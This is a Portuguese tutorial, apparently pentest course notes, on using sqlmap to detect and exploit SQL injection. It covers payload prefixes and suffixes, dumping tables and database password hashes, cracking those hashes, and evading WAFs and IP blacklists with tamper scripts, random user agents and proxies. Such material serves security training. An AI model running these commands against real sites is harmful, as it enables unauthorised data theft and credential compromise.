# 💉 SQLmap — Visão Geral

O sqlmap é uma ferramenta escrita em Python que automatiza:

* detecção de SQL Injection (SQLi);
* exploração da vulnerabilidade;
* enumeração de banco de dados;
* extração de dados.


---

# 🗄️ Bancos de Dados Suportados

O SQLmap suporta diversos SGBDs:

* MySQL
* SQLite
* Oracle
* PostgreSQL
* Firebird
* Microsoft SQL Server
* MariaDB
* IBM DB2
* Sybase
* e outros

---

# ⚔️ Tipos de SQL Injection Suportados

Utilizamos:

```bash id="r3quk0"
--technique=TECH
```

## Técnicas

| Letra | Técnica             | Descrição                      |
| ----- | ------------------- | ------------------------------ |
| B     | Boolean-based blind | Baseada em respostas booleanas |
| E     | Error-based         | Baseada em mensagens de erro   |
| U     | Union query-based   | Uso de UNION SELECT            |
| S     | Stacked queries     | Múltiplas queries              |
| T     | Time-based blind    | Baseada em atraso/resposta     |
| Q     | Inline queries      | Queries inline                 |

---

## ⚡ Velocidade das Técnicas

### Mais rápida

* `UNION query-based`

### Mais lentas

* `Boolean-based`
* `Time-based`

Porque precisam fazer múltiplas requisições para inferir informações.

---

# 🚀 Primeiros Passos

## Opções básicas

```bash id="tq2vgn"
sqlmap -h
```

Suficiente para a maioria dos casos.

---

## Opções avançadas

```bash id="2n1yy4"
sqlmap -hh
```

Mostra funcionalidades avançadas.

---

# 🎯 Cenário Básico

Uma aplicação recebe o ID do usuário via GET:

```php id="w7q3b7"
$link = mysqli_connect($host, $username, $password, $database, 3306);

$sql = "SELECT * FROM users WHERE id = " . $_GET["id"] . " LIMIT 0, 1";

$result = mysqli_query($link, $sql);

if (!$result)
    die("<b>SQL error:</b> ". mysqli_error($link) . "<br>\n");
```

---

## 🔥 Problema

O parâmetro `id` é inserido diretamente na query SQL.

Isso pode gerar:

* SQL Injection;
* XSS (dependendo do contexto);
* Vazamento de erros.

---

# ⚠️ Vazamento de Erros

A aplicação retorna erros SQL:

```php id="6nql0k"
die("<b>SQL error:</b> ". mysqli_error($link));
```

Isso facilita:

* detecção de SQLi;
* identificação do SGBD;
* criação de payloads.

---

# 🌐 URL Vulnerável

```text id="b8cl2v"
http://www.example.com/vuln.php?id=1
```

---

# ▶️ Executando SQLmap

```bash id="m52d8y"
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
```

## Flags

| Flag      | Função                               |
| --------- | ------------------------------------ |
| `-u`      | Define URL                           |
| `--batch` | Usa respostas padrão automaticamente |

---

# 🔍 Entendendo a Saída do SQLmap

## 📌 Conteúdo estável

```text id="clt2c4"
target URL content is stable
```

A página responde de forma consistente.

Facilita detectar SQLi.

---

## 📌 Parâmetro dinâmico

```text id="r0a6jw"
GET parameter 'id' appears to be dynamic
```

Mudanças no parâmetro alteram a resposta.

Bom sinal para testes.

---

## 📌 Teste heurístico

```text id="c0r18t"
heuristic (basic) test shows that GET parameter 'id' might be injectable
```

O SQLmap:

* injeta valores inválidos;
* observa erros e mudanças.

Exemplo:

```text id="a6q7k8"
?id=1"))'))...
```

⚠️ Isso NÃO confirma SQLi.
É apenas um indicativo.

---

## 📌 Identificação do banco

```text id="qz3k19"
possible DBMS: 'MySQL'
```

O SQLmap tenta identificar o SGBD.

---

# 🧪 Teste Rápido de XSS

```text id="y0k2wa"
heuristic (XSS) test shows that GET parameter 'id' might be vulnerable
```

O SQLmap também faz testes simples de XSS.

---

# 🗃️ Testes Específicos por Banco

```text id="pq3m0d"
Do you want to skip test payloads specific for other DBMSes?
```

Se o banco foi identificado:

* podemos focar apenas nele;
* reduzimos tempo;
* diminuímos ruído.

---

# 📈 Ampliação de Testes

```text id="8m4v2g"
extending provided level (1) and risk (1)
```

O SQLmap pode aumentar:

* quantidade de payloads;
* agressividade dos testes.

---

# 🔄 UNION Query

```text id="uqm6m1"
UNION query injection technique
```

O SQLmap tenta:

* descobrir número de colunas;
* identificar UNION SELECT utilizável.

---

# 📊 ORDER BY

```text id="e9k1yq"
ORDER BY technique appears to be usable
```

Usado para descobrir:

* quantidade correta de colunas.

Exemplo manual:

```sql id="6r2g5f"
ORDER BY 1
ORDER BY 2
ORDER BY 3
```

---

# ✅ Vulnerabilidade Confirmada

```text id="k5h3pw"
GET parameter 'id' is vulnerable
```

O parâmetro foi considerado vulnerável.

---

# 📝 Logs

```text id="u0f4pk"
fetched data logged to text files
```

Os resultados ficam salvos em:

```text id="6jp2mg"
/home/user/.sqlmap/output/
```

---

# 🌐 SQLmap com HTTP Requests

## ⚠️ Cuidados

Ao montar requisições:

* não esquecer cookies;
* não errar headers;
* não formatar POST incorretamente.

---

# 🛠️ Melhor Método: Copy as cURL

Nas DevTools do navegador:

1. Clique na requisição;
2. Copy;
3. Copy as cURL.

Depois cole no terminal.

---

# 🔄 GET vs POST

## GET

Parâmetros na URL.

```bash id="tbk6jm"
sqlmap -u "http://site.com/?id=1"
```

---

## POST

Usamos:

```bash id="j5k3qn"
--data
```

Exemplo:

```bash id="0p1cz8"
sqlmap -u "http://site.com" --data="uid=1&name=test"
```

---

# 🎯 Especificando o Parâmetro

Muito importante para reduzir falsos negativos.

## Com `-p`

```bash id="4mdvho"
-p uid
```

---

## Com `*`

```bash id="y2x0f3"
uid=1*
```

---

# 🧾 JSON e XML

O SQLmap suporta:

## JSON

```json id="d7x4uq"
{"id":1}
```

## XML

```xml id="oj9cl3"
<element><id>1</id></element>
```

---

# 📄 Requests Complexos

Podemos usar uma requisição completa salva em arquivo.

## Flag

```bash id="v0j9jz"
-r request.txt
```

Muito útil com:

* Burp Suite;
* Requests enormes;
* APIs.

---

# 🧰 Personalizando Requisições

## Cookies

```bash id="s0f9z8"
--cookie
```

---

## Headers

```bash id="1pz3jq"
-H
--header
```

---

## User-Agent

```bash id="g5v0fd"
-A
--user-agent
```

---

## Agente Aleatório

```bash id="8mxq1r"
--random-agent
```

Importante porque muitos WAFs bloqueiam o User-Agent padrão do SQLmap.

---

# 📱 Simular Celular

```bash id="4k4o1u"
--mobile
```

---

# 🔄 Alterar Método HTTP

```bash id="p1qt5q"
sqlmap -u www.site.com --data='id=1' --method PUT
```

---

# 🧮 Definir Número de Colunas

```bash id="q7w0pj"
--union-cols
```

Útil quando já sabemos a quantidade.

---

# 🐞 Lidando com Erros

## Mostrar erros

```bash id="6vw3aj"
--parse-errors
```

---

## Salvar tráfego

```bash id="h7a5yr"
-t
```

---

## Verbosidade

```bash id="r7g8xj"
-v
```

---

## Proxy

```bash id="w0a5lw"
--proxy
```

Permite:

* interceptar no Burp;
* analisar requisições;
* debugar ataques.

---

# 🧩 Prefixo e Sufixo

Algumas aplicações possuem contextos específicos:

* aspas;
* parênteses;
* LIKE;
* concatenações.

Usamos:

```bash id="jq3u3m"
--prefix
--suffix
```

---

## Query Original

```sql id="v9x0wm"
SELECT id,name,surname FROM users
WHERE id LIKE (('" . $_GET["q"] . "'))
LIMIT 0,1
```

---

## Comando SQLmap

```bash id="5xk8ga"
sqlmap -u "www.example.com/?q=test" \
--prefix="%'))" \
--suffix="-- -"
```

---

## Resultado

```sql id="w8j4sm"
(('test%')) UNION ALL SELECT 1,2,VERSION()-- -')) LIMIT 0,1
```

---

# ⚙️ Risk e Level

## Level

```bash id="o2n8v2"
--level
```

Define:

* quantidade de vetores testados.

### Intervalo

* 1 a 5

### Padrão

* 1

---

## Risk

```bash id="k4w7mn"
--risk
```

Define:

* agressividade;
* risco de impacto;
* possibilidade de DoS.

### Intervalo

* 1 a 3

---

# 📊 Comparação

| Configuração     | Testes por parâmetro |
| ---------------- | -------------------- |
| level 1 + risk 1 | ~76                  |
| level 5 + risk 3 | ~7.865               |

---

# 🎯 Redução de Falsos Negativos

## ✅ Especificar parâmetro

```bash id="1x9t9u"
-p id
```

ou:

```text id="2q0m7n"
?id=1*
```

---

## ✅ Informar banco

```bash id="8txm18"
--dbms=mysql
```

---

## ✅ Informar técnica

```bash id="u3d9x2"
--technique=E
```

### Técnicas úteis

| Técnica | Tipo            |
| ------- | --------------- |
| E       | Error-based     |
| B       | Boolean         |
| U       | UNION           |
| T       | Time-based      |
| S       | Stacked Queries |

---

# 🛡️ Evasão de WAF

## Tamper Scripts

```bash id="3m7u5g"
--tamper=randomcase
```

Exemplo:

* mistura maiúsculas/minúsculas;
* tenta burlar filtros.

---

## Agentes aleatórios

```bash id="j0v2bw"
--random-agent
```

Ajuda a evitar bloqueios simples.

---

# 📌 Resumo Final

## SQLmap automatiza:

* detecção;
* exploração;
* enumeração;
* extração de dados.

---

## Técnicas mais importantes

* UNION (mais rápida)
* Error-based
* Boolean-based
* Time-based

---

## Flags essenciais

| Flag             | Função               |
| ---------------- | -------------------- |
| `-u`             | URL                  |
| `--data`         | Dados POST           |
| `-p`             | Parâmetro específico |
| `--batch`        | Sem interação        |
| `--dbms`         | Banco específico     |
| `--technique`    | Técnica SQLi         |
| `--risk`         | Agressividade        |
| `--level`        | Quantidade de testes |
| `--proxy`        | Proxy/Burp           |
| `--random-agent` | User-Agent aleatório |
| `--tamper`       | Bypass de filtros    |


# 🗃️ Enumeração de Banco de Dados com SQLmap

Após confirmar que o alvo é vulnerável a SQL Injection, o próximo passo é:

* enumerar o banco;
* descobrir tabelas;
* identificar colunas;
* exfiltrar dados.

Tudo isso pode ser automatizado pelo sqlmap.

---

# 🎯 Objetivo da Enumeração

A enumeração busca recuperar:

* versão do banco;
* usuário atual;
* permissões;
* bancos existentes;
* tabelas;
* colunas;
* credenciais;
* dados sensíveis.

---

# 🔎 Enumeração Básica

## 📌 Banner do banco

```bash id="9e8r1n"
--banner
```

Mostra:

* versão do banco;
* informações do SGBD.

---

## 👤 Usuário atual

```bash id="2v7f0m"
--current-user
```

Mostra:

* usuário utilizado pela aplicação.

---

## 🗄️ Banco atual

```bash id="x8q1da"
--current-db
```

Retorna:

* nome do banco em uso.

---

## 👑 Verificar privilégios DBA

```bash id="2p9k7q"
--is-dba
```

Verifica se o usuário possui permissões administrativas.

---

# ▶️ Exemplo Completo

```bash id="s4j0m1"
sqlmap -u "http://meusite.com/?id=1*" \
-p id \
--banner \
--current-user \
--current-db \
--is-dba
```

---

# 📋 Enumeração de Tabelas

## Descobrir tabelas

```bash id="f5u1rn"
--tables
```

---

## Informar banco específico

```bash id="c2z7pk"
-D nomeBanco
```

---

# ▶️ Exemplo

```bash id="3g0tq9"
sqlmap -u "http://meusite.com/?id=1*" \
-p id \
--tables \
-D bancodedados
```

---

# 📦 Dump de Dados

Depois de identificar uma tabela:

```bash id="4u9z7r"
--dump
```

E:

```bash id="y5j2f3"
-T nomeTabela
```

---

# ▶️ Exemplo

```bash id="z8m3t0"
sqlmap -u "http://meusite.com/?id=1*" \
-p id \
--dump \
-T usuarios
```

---

# 💾 Formato da Saída

```bash id="5x9k8u"
--dump-format
```

Formatos suportados:

* HTML
* SQLite

---

# 🎯 Filtrando Colunas

Nem sempre queremos todas as colunas.

Usamos:

```bash id="1w0v9a"
-C
```

---

# ▶️ Exemplo

```bash id="q8y7pk"
sqlmap -u "http://meusite.com/?id=1*" \
-p id \
--dump \
-T usuarios \
-D bancodedados \
-C nome,senha
```

---

# 📄 Limitando Resultados

## Definir início e fim

```bash id="r7n3zm"
--start
--stop
```

---

# ▶️ Exemplo

```bash id="f4v8q2"
--start=1 --stop=3
```

Vai retornar:

* linha 1;
* linha 2;
* linha 3.

---

# 🔍 Enumeração Condicional

```bash id="3x2m1q"
--where
```

Permite aplicar filtros SQL.

---

# ▶️ Exemplo

```bash id="m8r1z4"
--where="name LIKE 'f%'"
```

Retorna:

* nomes iniciando com `f`.

---

# 🌎 Enumeração Completa

## Dump de todas as tabelas de um banco

```bash id="n0k8v1"
--dump -D database
```

Sem usar `-T`.

---

## Dump de TODOS os bancos

```bash id="9x4w0k"
--dump-all
```

---

## Ignorar bancos do sistema

```bash id="2r8v3y"
--exclude-sysdbs
```

---

# ▶️ Exemplo

```bash id="z1f9x8"
sqlmap --dump-all --exclude-sysdbs
```

---

# 🏗️ Enumeração Avançada

# 📐 Estrutura do Banco

```bash id="u7t4v9"
--schema
```

Mostra:

* databases;
* tabelas;
* colunas;
* estrutura completa.

---

# 🔎 Busca Inteligente

## Procurar tabelas

```bash id="j4v0m3"
--search -T user
```

Busca tabelas contendo:

* `user`.

---

## Procurar colunas

```bash id="k1q8x5"
--search -C pass
```

Busca colunas contendo:

* `pass`.

---

# 🔐 Enumeração e Quebra de Senhas

Ao encontrar hashes conhecidos, o SQLmap tenta quebrá-los automaticamente.

---

# ▶️ Exemplo

```bash id="g0v7z1"
sqlmap -u "http://meusite.com/?id=1*" \
-p id \
--dump \
-D database \
-T tabela
```

---

## Exemplo de hash

```text id="0n8k4t"
10945aa229a6d569f226976b22ea0e900a1fc219
```

O SQLmap pode:

* identificar o algoritmo;
* tentar cracking automático.

---

# 🔑 Credenciais do Banco

```bash id="p4v6m2"
--passwords
```

Tenta recuperar:

* usuários do banco;
* hashes;
* credenciais internas.

---

# ▶️ Exemplo

```bash id="3f7u2m"
sqlmap -u "http://meusite.com/?id=1*" \
-p id \
--passwords \
--batch
```

---

# 🛡️ Bypass de Proteções Web

# 🔒 Anti-CSRF Token

Algumas aplicações exigem tokens CSRF válidos.

```bash id="v8t3m1"
--csrf-token="token"
```

---

# 🎲 Unique Value Bypass

Algumas aplicações exigem valores únicos por requisição.

Usamos:

```bash id="5m0r7z"
--randomize
```

---

# ▶️ Exemplo

```bash id="8q2v1t"
sqlmap -u "http://www.example.com/?id=1&rp=29125" \
--randomize=rp \
--batch
```

---

# 🧮 Calculated Parameter Bypass

Algumas aplicações usam:

* hashes;
* assinaturas;
* parâmetros calculados.

Exemplo:

```text id="q1w8m7"
?id=1&h=c4ca4238a0b923820dcc509a6f75849b
```

Se o `id` mudar:

* o hash precisa mudar também.

---

# ⚙️ Flag `--eval`

Permite executar Python antes da requisição.

---

# ▶️ Exemplo

```bash id="1m3q8v"
--eval="import hashlib; h=hashlib.md5(id).hexdigest()"
```

O SQLmap:

* recalcula o hash automaticamente.

---

# 🌐 Ocultação de IP

## Proxy

```bash id="0f8r2m"
--proxy="socks4://IP:PORTA"
```

Usado para:

* bypass de blacklist;
* anonimização;
* rotação de IP.

---

# 📂 Lista de Proxies

```bash id="t2x5v7"
--proxy-file
```

Troca automaticamente quando um proxy falha.

---

# 🧱 Bypass de WAF

O SQLmap tenta detectar:

* Cloudflare;
* ModSecurity;
* outros WAFs.

---

## Pular detecção

```bash id="u7y0k4"
--skip-waf
```

---

# 🤖 User-Agent Blacklist

Muitos WAFs bloqueiam:

```text id="9z1w0m"
sqlmap/1.x.x
```

---

## Solução

```bash id="6v3t2n"
--random-agent
```

Troca o User-Agent automaticamente.

---

# 🧩 Tamper Scripts

Tamper scripts modificam payloads para:

* bypassar WAF;
* evitar filtros;
* alterar sintaxe.

---

# ▶️ Uso

```bash id="y8m7x1"
--tamper=randomcase
```

---

# 🛠️ Principais Tampers

| Tamper            | Função                        |   |   |
| ----------------- | ----------------------------- | - | - |
| `0eunion`         | Modifica UNION                |   |   |
| `base64encode`    | Codifica em Base64            |   |   |
| `between`         | Troca operadores              |   |   |
| `commalesslimit`  | Reescreve LIMIT               |   |   |
| `equaltolike`     | Troca `=` por `LIKE`          |   |   |
| `percentage`      | Adiciona `%`                  |   |   |
| `plus2concat`     | Troca `+` por CONCAT          |   |   |
| `randomcase`      | Mistura maiúsculas/minúsculas |   |   |
| `space2comment`   | Troca espaços por comentários |   |   |
| `space2dash`      | Usa `--`                      |   |   |
| `space2hash`      | Usa `#`                       |   |   |
| `space2plus`      | Usa `+`                       |   |   |
| `symboliclogical` | Troca AND/OR por `&&`/`       |   | ` |

---

# 📜 Listar Todos os Tampers

```bash id="8v4z7n"
--list-tampers
```

---

# 📦 Técnicas Extras

## Chunked Encoding

```bash id="q0v5x8"
--chunked
```

---

## HTTP Parameter Pollution (HPP)

Manipulação de parâmetros HTTP para bypass.

---

# 📌 Resumo Final

## Enumeração permite:

* descobrir bancos;
* identificar tabelas;
* recuperar colunas;
* extrair dados;
* obter credenciais.

---

## Flags mais importantes

| Flag             | Função               |
| ---------------- | -------------------- |
| `--banner`       | Versão do banco      |
| `--current-user` | Usuário atual        |
| `--current-db`   | Banco atual          |
| `--tables`       | Listar tabelas       |
| `--dump`         | Extrair dados        |
| `-D`             | Banco específico     |
| `-T`             | Tabela específica    |
| `-C`             | Colunas específicas  |
| `--schema`       | Estrutura completa   |
| `--search`       | Busca inteligente    |
| `--passwords`    | Credenciais do banco |
| `--proxy`        | Proxy                |
| `--tamper`       | Bypass de WAF        |
| `--random-agent` | Alterar User-Agent   |

---

